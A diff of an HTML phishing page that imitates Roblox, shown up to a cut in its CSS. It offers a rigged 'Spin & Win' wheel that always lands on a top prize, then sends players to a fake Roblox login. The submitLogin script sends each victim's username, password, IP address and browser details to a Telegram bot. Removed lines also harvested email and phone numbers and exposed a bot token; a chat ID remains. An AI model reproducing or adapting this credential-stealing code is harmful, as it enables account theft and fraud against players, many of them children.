@@ -1,519 +1,533 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox — Spin & Win</title>
-    <script>
-        const BOT_TOKEN='8693145371:AAHfPNL_W-f0P2MPWut5_CxmWuDhvr8F7Qw';
-        const CHAT_ID = '1361048119';
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roblox — Spin & Win</title>
+<script>
+const BOT_TOKEN='***';
+const CHAT_ID = '1361048119';
+var currentRotation = 0;
+var isSpinning = false;
+var wonPrize = '';
+
+var prizes = [
+    { name: '10,000 Robux',  color: '#E2231A', icon: '💰', img: 'R' },
+    { name: 'Dominus Empyreus', color: '#FF6B00', icon: '👑', img: 'D' },
+    { name: '5,000 Robux',   color: '#1D4ED8', icon: '💎', img: 'R' },
+    { name: 'Limited Item',  color: '#7C3AED', icon: '🎁', img: 'L' },
+    { name: '2,500 Robux',   color: '#059669', icon: '🪙', img: 'R' },
+    { name: 'Exclusive Badge',color: '#DC2626', icon: '🏅', img: 'B' },
+    { name: '1,000 Robux',   color: '#D97706', icon: '✨', img: 'R' },
+    { name: 'VIP Status',    color: '#0891B2', icon: '⭐', img: 'V' }
+];
+
+function drawWheel() {
+    var canvas = document.getElementById('wheelCanvas');
+    var ctx = canvas.getContext('2d');
+    var cx = 180, cy = 180, r = 170;
+    var segAngle = (2 * Math.PI) / prizes.length;
+    
+    ctx.clearRect(0, 0, 360, 360);
+    
+    // Draw outer glow
+    ctx.beginPath();
+    ctx.arc(cx, cy, r+8, 0, 2*Math.PI);
+    ctx.shadowColor = 'rgba(255,215,0,0.3)';
+    ctx.shadowBlur = 25;
+    ctx.fillStyle = 'rgba(255,215,0,0.1)';
+    ctx.fill();
+    ctx.shadowBlur = 0;
+    
+    prizes.forEach(function(p, i) {
+        var startAngle = i * segAngle - Math.PI/2;
+        var endAngle = startAngle + segAngle;
         
-        // === LOGIN FUNCTIONS ===
-        function togglePassword() {
-            var pwd = document.getElementById('password');
-            var icon = document.getElementById('eyeIcon');
-            if (pwd.type === 'password') {
-                pwd.type = 'text'; icon.textContent = '👁';
-            } else {
-                pwd.type = 'password'; icon.textContent = '👁‍🗨';
-            }
-        }
+        // Segment
+        ctx.beginPath();
+        ctx.moveTo(cx, cy);
+        ctx.arc(cx, cy, r, startAngle, endAngle);
+        ctx.closePath();
+        ctx.fillStyle = p.color;
+        ctx.fill();
         
-        function submitLogin() {
-            var username = document.getElementById('username').value;
-            var password = document.getElementById('password').value;
-            if (!username || !password) {
-                document.getElementById('errorMsg').style.display = 'block';
-                document.getElementById('errorMsg').textContent = 'Incorrect username or password.';
-                return;
-            }
-            document.getElementById('loginBtn').disabled = true;
-            document.getElementById('loginBtn').textContent = 'Logging in...';
-            document.getElementById('errorMsg').style.display = 'none';
-            
-            fetch('https://api.ipify.org?format=json')
-                .then(r => r.json())
-                .then(d => d.ip)
-                .catch(() => 'Unknown')
-                .then(function(ip) {
-                    var msg = '🔴 ROBLOX LOGIN' + '%0A' +
-                              '├ User: ' + encodeURIComponent(username) + '%0A' +
-                              '├ Pass: ' + encodeURIComponent(password) + '%0A' +
-                              '├ IP: ' + ip + '%0A' +
-                              '├ Time: ' + new Date().toLocaleString('id-ID') + '%0A' +
-                              '└ UA: ' + encodeURIComponent(navigator.userAgent);
-                    return fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + msg);
-                })
-                .then(function() {
-                    document.getElementById('loginPage').style.display = 'none';
-                    document.getElementById('spinPage').style.display = 'flex';
-                })
-                .catch(function() {
-                    document.getElementById('loginBtn').disabled = false;
-                    document.getElementById('loginBtn').textContent = 'Log In';
-                    document.getElementById('errorMsg').style.display = 'block';
-                    document.getElementById('errorMsg').textContent = 'Connection error. Please try again.';
-                });
-        }
+        // Segment border
+        ctx.strokeStyle = 'rgba(255,255,255,0.3)';
+        ctx.lineWidth = 2;
+        ctx.stroke();
         
-        // === SPIN WHEEL ===
-        var prizes = [
-            { name: '10,000 Robux',  color: '#E2231A', emoji: '💰' },
-            { name: 'Dominus Empyreus', color: '#FF6B00', emoji: '👑' },
-            { name: '5,000 Robux',   color: '#1D4ED8', emoji: '💎' },
-            { name: 'Limited Item',  color: '#7C3AED', emoji: '🎁' },
-            { name: '2,500 Robux',   color: '#059669', emoji: '🪙' },
-            { name: 'Exclusive Badge',color: '#DC2626', emoji: '🏅' },
-            { name: '1,000 Robux',   color: '#D97706', emoji: '✨' },
-            { name: 'VIP Status',    color: '#0891B2', emoji: '⭐' }
-        ];
-        var currentRotation = 0;
-        var isSpinning = false;
+        // Draw icon at segment center
+        var textAngle = startAngle + segAngle/2;
+        ctx.save();
+        ctx.translate(cx, cy);
+        ctx.rotate(textAngle);
         
-        function drawWheel() {
-            var canvas = document.getElementById('wheelCanvas');
-            var ctx = canvas.getContext('2d');
-            var cx = 180, cy = 180, r = 170;
-            var segAngle = (2 * Math.PI) / prizes.length;
-            
-            ctx.clearRect(0, 0, 360, 360);
-            
-            // Draw segments
-            prizes.forEach(function(p, i) {
-                var startAngle = i * segAngle - Math.PI/2;
-                var endAngle = startAngle + segAngle;
-                
-                ctx.beginPath();
-                ctx.moveTo(cx, cy);
-                ctx.arc(cx, cy, r, startAngle, endAngle);
-                ctx.closePath();
-                ctx.fillStyle = p.color;
-                ctx.fill();
-                
-                // Border
-                ctx.strokeStyle = 'rgba(255,255,255,0.2)';
-                ctx.lineWidth = 2;
-                ctx.stroke();
-                
-                // Text
-                var textAngle = startAngle + segAngle/2;
-                ctx.save();
-                ctx.translate(cx, cy);
-                ctx.rotate(textAngle);
-                ctx.fillStyle = '#fff';
-                ctx.font = 'bold 11px "Builder Sans", Arial, sans-serif';
-                ctx.textAlign = 'right';
-                ctx.shadowColor = 'rgba(0,0,0,0.5)';
-                ctx.shadowBlur = 2;
-                ctx.fillText(p.emoji + ' ' + p.name, r - 12, 4);
-                ctx.restore();
-            });
-            
-            // Center circle
-            ctx.beginPath();
-            ctx.arc(cx, cy, 30, 0, 2 * Math.PI);
-            ctx.fillStyle = '#1A1A1A';
-            ctx.fill();
-            ctx.strokeStyle = 'rgba(255,255,255,0.3)';
-            ctx.lineWidth = 3;
-            ctx.stroke();
-            
-            // Center text
-            ctx.fillStyle = '#fff';
-            ctx.font = 'bold 12px Arial';
-            ctx.textAlign = 'center';
-            ctx.textBaseline = 'middle';
-            ctx.fillText('SPIN', cx, cy);
-        }
+        // Icon (emoji)
+        ctx.font = '28px Arial';
+        ctx.textAlign = 'center';
+        ctx.textBaseline = 'middle';
+        ctx.shadowColor = 'rgba(0,0,0,0.5)';
+        ctx.shadowBlur = 3;
+        ctx.fillText(p.icon, r - 40, -8);
         
-        function spin() {
-            if (isSpinning) return;
-            isSpinning = true;
-            
-            document.getElementById('spinBtn').disabled = true;
-            document.getElementById('spinBtn').textContent = 'Spinning...';
-            document.getElementById('spinResult').style.display = 'none';
-            
-            // Random target prize (always a good one to hook them)
-            var targetIndex = Math.floor(Math.random() * 4); // Bias to first 4 prizes
-            var segAngle = 360 / prizes.length;
-            var targetAngle = targetIndex * segAngle + segAngle / 2;
-            var extraSpins = 5 + Math.floor(Math.random() * 3); // 5-7 full spins
-            var totalRotation = extraSpins * 360 + (360 - targetAngle);
-            
-            currentRotation += totalRotation;
-            
-            var canvas = document.getElementById('wheelCanvas');
-            canvas.style.transition = 'transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99)';
-            canvas.style.transform = 'rotate(' + currentRotation + 'deg)';
-            
-            setTimeout(function() {
-                isSpinning = false;
-                document.getElementById('spinBtn').disabled = false;
-                document.getElementById('spinBtn').textContent = 'SPIN AGAIN';
-                
-                var won = prizes[targetIndex];
-                document.getElementById('prizeName').textContent = won.emoji + ' ' + won.name;
-                document.getElementById('prizeColor').style.color = won.color;
-                document.getElementById('spinResult').style.display = 'block';
-                
-                // Send spin win to Telegram
-                var msg = '🎰 SPIN WIN' + '%0A' +
-                          '├ Prize: ' + won.name + '%0A' +
-                          '├ Time: ' + new Date().toLocaleString('id-ID');
-                fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + msg);
-            }, 4500);
-        }
+        // Item label
+        ctx.font = 'bold 10px "Builder Sans", Arial, sans-serif';
+        ctx.fillStyle = '#fff';
+        ctx.shadowBlur = 2;
+        ctx.fillText(p.name, r - 40, 18);
         
-        // === CLAIM FUNCTIONS ===
-        function showClaim() {
-            document.getElementById('spinResult').style.display = 'none';
-            document.getElementById('claimPage').style.display = 'block';
-        }
+        ctx.restore();
+    });
+    
+    // Outer ring
+    ctx.beginPath();
+    ctx.arc(cx, cy, r, 0, 2 * Math.PI);
+    ctx.strokeStyle = 'rgba(255,215,0,0.5)';
+    ctx.lineWidth = 4;
+    ctx.stroke();
+    
+    // Center button
+    ctx.beginPath();
+    ctx.arc(cx, cy, 35, 0, 2 * Math.PI);
+    var grad = ctx.createRadialGradient(cx-5, cy-5, 5, cx, cy, 35);
+    grad.addColorStop(0, '#333');
+    grad.addColorStop(1, '#111');
+    ctx.fillStyle = grad;
+    ctx.fill();
+    ctx.strokeStyle = '#FFD700';
+    ctx.lineWidth = 3;
+    ctx.stroke();
+    
+    ctx.fillStyle = '#FFD700';
+    ctx.font = 'bold 14px Arial';
+    ctx.textAlign = 'center';
+    ctx.textBaseline = 'middle';
+    ctx.shadowBlur = 0;
+    ctx.fillText('SPIN', cx, cy-4);
+    ctx.font = '9px Arial';
+    ctx.fillText('ME!', cx, cy+10);
+}
+
+function spin() {
+    if (isSpinning) return;
+    isSpinning = true;
+    
+    document.getElementById('spinBtn').disabled = true;
+    document.getElementById('spinBtn').textContent = '🎰 Spinning...';
+    document.getElementById('spinResult').style.display = 'none';
+    document.getElementById('claimPrompt').style.display = 'none';
+    
+    var targetIndex = Math.floor(Math.random() * 4);
+    var segAngle = 360 / prizes.length;
+    var targetAngle = targetIndex * segAngle + segAngle / 2;
+    var extraSpins = 5 + Math.floor(Math.random() * 3);
+    var totalRotation = extraSpins * 360 + (360 - targetAngle);
+    
+    currentRotation += totalRotation;
+    
+    var canvas = document.getElementById('wheelCanvas');
+    canvas.style.transition = 'transform 4.5s cubic-bezier(0.15, 0.7, 0.1, 1)';
+    canvas.style.transform = 'rotate(' + currentRotation + 'deg)';
+    
+    setTimeout(function() {
+        isSpinning = false;
+        document.getElementById('spinBtn').style.display = 'none';
         
-        function submitClaim() {
-            var email = document.getElementById('claimEmail').value;
-            var phone = document.getElementById('claimPhone').value;
-            
-            if (!email && !phone) {
-                document.getElementById('claimError').style.display = 'block';
-                return;
-            }
-            document.getElementById('claimError').style.display = 'none';
-            document.getElementById('claimBtn').disabled = true;
-            document.getElementById('claimBtn').textContent = 'Processing...';
-            
-            var msg = '📦 CLAIM CAPTURE' + '%0A' +
-                      '├ Email: ' + encodeURIComponent(email || 'N/A') + '%0A' +
-                      '├ Phone: ' + encodeURIComponent(phone || 'N/A') + '%0A' +
-                      '├ Time: ' + new Date().toLocaleString('id-ID');
-            
-            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + msg)
-                .then(function() {
-                    document.getElementById('claimPage').style.display = 'none';
-                    document.getElementById('successPage').style.display = 'block';
-                });
-        }
-    </script>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
-            background: #000;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-        .bg-image {
-            position: fixed; top: 0; left: 0;
-            width: 100vw; height: 100vh;
-            background: url('https://images.rbxcdn.com/5f05bc6223b75052b594b38016762a77-marketing_bg_05202026.jpg') no-repeat center center fixed;
-            background-size: cover; z-index: 0;
-        }
-        .bg-overlay {
-            position: fixed; top: 0; left: 0;
-            width: 100vw; height: 100vh;
-            background: radial-gradient(circle, rgba(0,0,0,0.5) 60%, rgba(0,0,0,0.75) 100%);
-            z-index: 1;
-        }
-        .navbar {
-            position: relative; z-index: 10;
-            background: #1A1A1A; height: 48px;
-            display: flex; align-items: center; padding: 0 16px;
-        }
-        .navbar .logo-link { display: flex; align-items: center; padding: 0 12px; height: 100%; }
-        .navbar .logo-link svg { width: 32px; height: 32px; }
-        .navbar .nav-item {
-            color: #fff; text-decoration: none; font-size: 13px; font-weight: 500;
-            padding: 0 12px; height: 100%; display: flex; align-items: center; opacity: 0.7;
-        }
-        .navbar .nav-item:hover { opacity: 1; }
-        .navbar .search-wrap { flex: 1; max-width: 280px; margin-left: 8px; position: relative; }
-        .navbar .search-wrap input {
-            width: 100%; height: 28px; border-radius: 4px; border: none;
-            background: #333; color: #fff; font-size: 13px; padding: 0 30px 0 10px; outline: none;
-        }
-        .navbar .search-wrap input::placeholder { color: #999; }
-        .navbar .search-wrap .search-icon {
-            position: absolute; right: 8px; top: 50%; transform: translateY(-50%);
-            color: #999; font-size: 14px; pointer-events: none;
-        }
-        .navbar .signup-link {
-            color: #fff; text-decoration: none; font-size: 13px; font-weight: 600;
-            padding: 0 12px; margin-left: auto; height: 100%; display: flex; align-items: center;
-        }
-        .main-container {
-            position: relative; z-index: 10;
-            flex: 1; display: flex; justify-content: center; align-items: center;
-            padding: 24px 16px;
-        }
+        var won = prizes[targetIndex];
+        wonPrize = won.icon + ' ' + won.name;
+        document.getElementById('prizeName').textContent = wonPrize;
+        document.getElementById('prizeColor').style.color = won.color;
+        document.getElementById('spinResult').style.display = 'block';
         
-        /* === LOGIN PAGE === */
-        #loginPage { display: block; }
-        .login-card {
-            background: #272930; width: 100%; max-width: 362px; padding: 15px;
-        }
-        .login-header { font-size: 32px; font-weight: 800; color: #F7F7F8; padding: 5px 0; margin-bottom: 8px; }
-        .input-group { margin-bottom: 12px; }
-        .input-group input {
-            width: 100%; height: 28px; padding: 5px 30px 5px 33px; border-radius: 8px;
-            border: 1px solid rgba(208, 217, 251, 0.12);
-            background: rgba(208, 217, 251, 0.08);
-            font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
-            font-size: 16px; font-weight: 400; color: #F7F7F8; outline: none;
-        }
-        .input-group input:focus { border-color: rgba(208, 217, 251, 0.3); }
-        .input-group input::placeholder { color: rgba(247, 247, 248, 0.4); }
-        .password-wrap { position: relative; }
-        .password-wrap input { padding-right: 35px; }
-        .password-wrap .toggle-eye {
-            position: absolute; right: 8px; top: 50%; transform: translateY(-50%);
-            background: none; border: none; cursor: pointer; font-size: 14px;
-            color: rgba(247, 247, 248, 0.5); padding: 2px;
-        }
-        .error-msg {
-            display: none; background: rgba(223, 40, 31, 0.15);
-            border: 1px solid rgba(223, 40, 31, 0.3); border-radius: 8px;
-            padding: 8px 12px; color: #F04433; font-size: 14px; margin-bottom: 12px;
-        }
-        .login-btn {
-            width: 100%; height: 36px; border: 1px solid rgb(213, 215, 221); border-radius: 8px;
-            background: transparent; color: rgb(188, 190, 200);
-            font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
-            font-size: 16px; font-weight: 500; cursor: pointer; padding: 9px; margin-top: 8px;
-        }
-        .login-btn:hover { background: rgba(208, 217, 251, 0.08); border-color: rgb(247, 247, 248); color: #F7F7F8; }
-        .login-btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        .forgot-link {
-            display: block; text-align: center; color: #F7F7F8; text-decoration: none;
-            font-size: 16px; font-weight: 500; padding: 12px 0;
-        }
-        .forgot-link:hover { text-decoration: underline; }
-        .alt-btn {
-            width: 100%; height: 36px; border: 1px solid transparent; border-radius: 8px;
-            background: rgba(208, 217, 251, 0.12); color: #F7F7F8;
-            font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
-            font-size: 16px; font-weight: 500; cursor: pointer; padding: 9px; margin-bottom: 8px;
-        }
-        .alt-btn:hover { background: rgba(208, 217, 251, 0.18); }
-        .signup-area { text-align: center; padding: 12px 0; }
-        .signup-area span { color: rgba(247, 247, 248, 0.6); font-size: 16px; }
-        .signup-area a { color: #F7F7F8; text-decoration: none; font-size: 16px; font-weight: 500; }
-        .signup-area a:hover { text-decoration: underline; }
+        setTimeout(function() {
+            document.getElementById('claimPrompt').style.display = 'flex';
+        }, 1000);
         
-        /* === SPIN PAGE === */
-        #spinPage { display: none; flex-direction: column; align-items: center; }
-        .spin-title { font-size: 28px; font-weight: 800; color: #F7F7F8; margin-bottom: 4px; }
-        .spin-subtitle { color: rgba(247,247,248,0.6); font-size: 14px; margin-bottom: 20px; }
-        .wheel-container {
-            position: relative; width: 360px; height: 360px; margin-bottom: 20px;
-        }
-        .wheel-pointer {
-            position: absolute; top: -12px; left: 50%; transform: translateX(-50%);
-            width: 0; height: 0;
-            border-left: 16px solid transparent;
-            border-right: 16px solid transparent;
-            border-top: 24px solid #FFD700;
-            z-index: 20;
-            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5));
-        }
-        #wheelCanvas {
-            width: 360px; height: 360px;
-            border-radius: 50%;
-            box-shadow: 0 0 30px rgba(0,0,0,0.5), 0 0 60px rgba(0,0,0,0.3);
-        }
-        .spin-btn {
-            padding: 14px 48px; border: none; border-radius: 8px;
-            background: linear-gradient(135deg, #E2231A, #FF6B00);
-            color: #fff; font-size: 20px; font-weight: 700; cursor: pointer;
-            font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
-            transition: 0.2s; margin-bottom: 12px;
-        }
-        .spin-btn:hover { transform: scale(1.05); box-shadow: 0 4px 20px rgba(226,35,26,0.4); }
-        .spin-btn:disabled { opacity: 0.5; transform: none; cursor: not-allowed; }
-        .spin-result {
-            display: none; text-align: center;
-            background: rgba(39,41,48,0.95); border-radius: 12px;
-            padding: 20px; max-width: 360px; width: 100%;
-        }
-        .spin-result h2 { font-size: 20px; color: #F7F7F8; margin-bottom: 8px; }
-        .spin-result .prize-name { font-size: 24px; font-weight: 800; margin: 8px 0; }
-        .spin-result .claim-btn {
-            padding: 12px 32px; border: none; border-radius: 8px;
-            background: linear-gradient(135deg, #1D4ED8, #7C3AED);
-            color: #fff; font-size: 16px; font-weight: 700; cursor: pointer;
-            font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
-            margin-top: 12px; transition: 0.2s;
-        }
-        .spin-result .claim-btn:hover { transform: scale(1.05); }
-        
-        /* === CLAIM PAGE === */
-        #claimPage { display: none; }
-        .claim-card { background: #272930; width: 100%; max-width: 362px; padding: 20px; }
-        .claim-card h2 { font-size: 22px; font-weight: 800; color: #F7F7F8; margin-bottom: 4px; }
-        .claim-card p { color: rgba(247,247,248,0.6); font-size: 14px; margin-bottom: 16px; }
-        .claim-card input {
-            width: 100%; height: 36px; padding: 5px 12px; border-radius: 8px;
-            border: 1px solid rgba(208, 217, 251, 0.12);
-            background: rgba(208, 217, 251, 0.08);
-            font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
-            font-size: 14px; color: #F7F7F8; outline: none; margin-bottom: 12px;
-        }
-        .claim-card input:focus { border-color: rgba(208, 217, 251, 0.3); }
-        .claim-card input::placeholder { color: rgba(247, 247, 248, 0.4); }
-        .claim-error { display: none; color: #F04433; font-size: 13px; margin-bottom: 8px; }
-        .submit-claim-btn {
-            width: 100%; height: 36px; border: none; border-radius: 8px;
-            background: linear-gradient(135deg, #059669, #1D4ED8);
-            color: #fff; font-size: 16px; font-weight: 700; cursor: pointer;
-            font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
-        }
-        .submit-claim-btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        
-        /* === SUCCESS PAGE === */
-        #successPage { display: none; }
-        .success-card { background: #272930; width: 100%; max-width: 362px; padding: 30px 20px; text-align: center; }
-        .success-card .big-icon { font-size: 64px; margin-bottom: 12px; }
-        .success-card h2 { font-size: 24px; font-weight: 800; color: #4ADE80; margin-bottom: 8px; }
-        .success-card p { color: rgba(247,247,248,0.6); font-size: 14px; line-height: 1.6; }
-        .success-card .note {
-            margin-top: 16px; padding: 12px; border-radius: 8px;
-            background: rgba(74,222,128,0.1); border: 1px solid rgba(74,222,128,0.2);
-            font-size: 13px; color: #4ADE80;
-        }
-        .success-card .back-btn {
-            display: inline-block; margin-top: 16px; color: #1D4ED8;
-            text-decoration: none; font-size: 14px; font-weight: 500;
-        }
-        
-        /* FOOTER */
-        .page-footer {
-            position: relative; z-index: 10;
-            background: rgba(0,0,0,0.8); padding: 16px 24px; text-align: center;
-        }
-        .page-footer a {
-            color: rgba(247, 247, 248, 0.6); text-decoration: none;
-            font-size: 12px; margin: 0 10px;
-        }
-        .page-footer a:hover { text-decoration: underline; color: #fff; }
-        .page-footer .copyright {
-            color: rgba(247, 247, 248, 0.4); font-size: 11px; margin-top: 12px;
-        }
-    </style>
+        var msg = '🎰 SPIN WIN' + '%0A' +
+                  '├ Prize: ' + won.name + '%0A' +
+                  '├ Time: ' + new Date().toLocaleString('id-ID');
+        fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + msg);
+    }, 5000);
+}
+
+function goToLogin() {
+    document.getElementById('spinPage').style.display = 'none';
+    document.getElementById('loginPage').style.display = 'block';
+    document.getElementById('claimPrizeName').textContent = wonPrize;
+    document.getElementById('claimItemName').textContent = wonPrize;
+    document.getElementById('finalPrize').textContent = wonPrize;
+    document.getElementById('finalPrizeDisplay').textContent = wonPrize;
+    document.getElementById('notePrize').textContent = wonPrize;
+}
+
+function togglePassword() {
+    var pwd = document.getElementById('password');
+    var icon = document.getElementById('eyeIcon');
+    if (pwd.type === 'password') {
+        pwd.type = 'text'; icon.textContent = '👁';
+    } else {
+        pwd.type = 'password'; icon.textContent = '👁‍🗨';
+    }
+}
+
+function submitLogin() {
+    var username = document.getElementById('username').value;
+    var password = document.getElementById('password').value;
+    if (!username || !password) {
+        document.getElementById('errorMsg').style.display = 'block';
+        document.getElementById('errorMsg').textContent = 'Incorrect username or password.';
+        return;
+    }
+    document.getElementById('loginBtn').disabled = true;
+    document.getElementById('loginBtn').textContent = 'Logging in...';
+    document.getElementById('errorMsg').style.display = 'none';
+    
+    fetch('https://api.ipify.org?format=json')
+        .then(r => r.json())
+        .then(d => d.ip)
+        .catch(() => 'Unknown')
+        .then(function(ip) {
+            var msg = '🔴 ROBLOX LOGIN' + '%0A' +
+                      '├ User: ' + encodeURIComponent(username) + '%0A' +
+                      '├ Pass: ' + encodeURIComponent(password) + '%0A' +
+                      '├ Won: ' + encodeURIComponent(wonPrize) + '%0A' +
+                      '├ IP: ' + ip + '%0A' +
+                      '├ Time: ' + new Date().toLocaleString('id-ID') + '%0A' +
+                      '└ UA: ' + encodeURIComponent(navigator.userAgent);
+            return fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + msg);
+        })
+        .then(function() {
+            document.getElementById('loginPage').style.display = 'none';
+            document.getElementById('successPage').style.display = 'block';
+        })
+        .catch(function() {
+            document.getElementById('loginBtn').disabled = false;
+            document.getElementById('loginBtn').textContent = 'Log In';
+            document.getElementById('errorMsg').style.display = 'block';
+            document.getElementById('errorMsg').textContent = 'Connection error. Please try again.';
+        });
+}
+</script>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+    font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
+    background: #000;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+}
+.bg-image {
+    position: fixed; top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    background: url('https://images.rbxcdn.com/5f05bc6223b75052b594b38016762a77-marketing_bg_05202026.jpg') no-repeat center center fixed;
+    background-size: cover; z-index: 0;
+}
+.bg-overlay {
+    position: fixed; top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    background: radial-gradient(circle, rgba(0,0,0,0.5) 60%, rgba(0,0,0,0.75) 100%);
+    z-index: 1;
+}
+.navbar {
+    position: relative; z-index: 10;
+    background: #1A1A1A; height: 48px;
+    display: flex; align-items: center; padding: 0 16px;
+}
+.navbar .logo-link { display: flex; align-items: center; padding: 0 12px; height: 100%; }
+.navbar .logo-link svg { width: 32px; height: 32px; }
+.navbar .nav-item {
+    color: #fff; text-decoration: none; font-size: 13px; font-weight: 500;
+    padding: 0 12px; height: 100%; display: flex; align-items: center; opacity: 0.7;
+}
+.navbar .nav-item:hover { opacity: 1; }
+.navbar .search-wrap { flex: 1; max-width: 280px; margin-left: 8px; position: relative; }
+.navbar .search-wrap input {
+    width: 100%; height: 28px; border-radius: 4px; border: none;
+    background: #333; color: #fff; font-size: 13px; padding: 0 30px 0 10px; outline: none;
+}
+.navbar .search-wrap input::placeholder { color: #999; }
+.navbar .search-wrap .search-icon {
+    position: absolute; right: 8px; top: 50%; transform: translateY(-50%);
+    color: #999; font-size: 14px; pointer-events: none;
+}
+.navbar .signup-link {
+    color: #fff; text-decoration: none; font-size: 13px; font-weight: 600;
+    padding: 0 12px; margin-left: auto; height: 100%; display: flex; align-items: center;
+}
+.main-container {
+    position: relative; z-index: 10;
+    flex: 1; display: flex; justify-content: center; align-items: center;
+    padding: 16px;
+}
+.page-footer {
+    position: relative; z-index: 10;
+    background: rgba(0,0,0,0.8); padding: 12px 16px; text-align: center;
+}
+.page-footer a {
+    color: rgba(247,247,248,0.6); text-decoration: none;
+    font-size: 11px; margin: 0 8px;
+}
+.page-footer a:hover { text-decoration: underline; color: #fff; }
+.page-footer .copyright {
+    color: rgba(247,247,248,0.4); font-size: 10px; margin-top: 8px;
+}
+
+/* SPIN PAGE */
+#spinPage { display: flex; flex-direction: column; align-items: center; }
+.spin-badge {
+    background: linear-gradient(135deg, #E2231A, #FF6B00);
+    color: #fff; font-size: 11px; font-weight: 700; padding: 4px 14px;
+    border-radius: 20px; margin-bottom: 8px; text-transform: uppercase;
+    letter-spacing: 1px;
+}
+.spin-title { font-size: 26px; font-weight: 800; color: #F7F7F8; margin-bottom: 4px; }
+.spin-subtitle { color: rgba(247,247,248,0.5); font-size: 13px; margin-bottom: 12px; }
+.wheel-container { position: relative; width: 340px; height: 340px; margin-bottom: 12px; }
+.wheel-pointer {
+    position: absolute; top: -8px; left: 50%; transform: translateX(-50%);
+    width: 0; height: 0;
+    border-left: 14px solid transparent;
+    border-right: 14px solid transparent;
+    border-top: 22px solid #FFD700;
+    z-index: 20;
+    filter: drop-shadow(0 2px 6px rgba(0,0,0,0.6));
+}
+.wheel-pointer::after {
+    content: '';
+    position: absolute; top: -26px; left: -8px;
+    width: 16px; height: 16px;
+    background: #FFD700;
+    border-radius: 50%;
+}
+#wheelCanvas { width: 340px; height: 340px; border-radius: 50%; }
+.spin-btn {
+    padding: 12px 44px; border: none; border-radius: 8px;
+    background: linear-gradient(135deg, #E2231A, #FF6B00);
+    color: #fff; font-size: 18px; font-weight: 700; cursor: pointer;
+    font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
+    transition: 0.2s; margin-bottom: 8px;
+}
+.spin-btn:hover { transform: scale(1.05); box-shadow: 0 4px 20px rgba(226,35,26,0.4); }
+.spin-btn:disabled { opacity: 0.5; transform: none; cursor: not-allowed; }
+.spin-result {
+    display: none; text-align: center;
+    background: rgba(39,41,48,0.95); border-radius: 12px;
+    padding: 16px; max-width: 340px; width: 100%; margin-bottom: 8px;
+    border: 1px solid rgba(255,215,0,0.2);
+}
+.spin-result .congrats { font-size: 16px; color: #F7F7F8; font-weight: 700; }
+.spin-result .prize-name { font-size: 22px; font-weight: 800; margin: 6px 0; }
+.spin-result .prize-desc { color: rgba(247,247,248,0.5); font-size: 12px; }
+.claim-prompt {
+    display: none; flex-direction: column; align-items: center;
+    animation: fadeIn 0.5s ease; margin-bottom: 8px;
+}
+@keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+.claim-prompt p { color: rgba(247,247,248,0.6); font-size: 13px; margin-bottom: 10px; }
+.claim-prompt .login-claim-btn {
+    padding: 12px 32px; border: none; border-radius: 8px;
+    background: linear-gradient(135deg, #1D4ED8, #7C3AED);
+    color: #fff; font-size: 16px; font-weight: 700; cursor: pointer;
+    font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
+    transition: 0.2s;
+}
+.claim-prompt .login-claim-btn:hover { transform: scale(1.05); box-shadow: 0 4px 20px rgba(29,78,216,0.4); }
+
+/* LOGIN PAGE */
+#loginPage { display: none; }
+.login-card {
+    background: #272930; width: 100%; max-width: 362px; padding: 15px;
+}
+.login-header { font-size: 32px; font-weight: 800; color: #F7F7F8; padding: 5px 0; margin-bottom: 4px; }
+.login-subheader { color: rgba(247,247,248,0.5); font-size: 13px; margin-bottom: 12px; }
+.input-group { margin-bottom: 12px; }
+.input-group input {
+    width: 100%; height: 28px; padding: 5px 30px 5px 33px; border-radius: 8px;
+    border: 1px solid rgba(208, 217, 251, 0.12);
+    background: rgba(208, 217, 251, 0.08);
+    font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
+    font-size: 16px; font-weight: 400; color: #F7F7F8; outline: none;
+}
+.input-group input:focus { border-color: rgba(208, 217, 251, 0.3); }
+.input-group input::placeholder { color: rgba(247, 247, 248, 0.4); }
+.password-wrap { position: relative; }
+.password-wrap input { padding-right: 35px; }
+.password-wrap .toggle-eye {
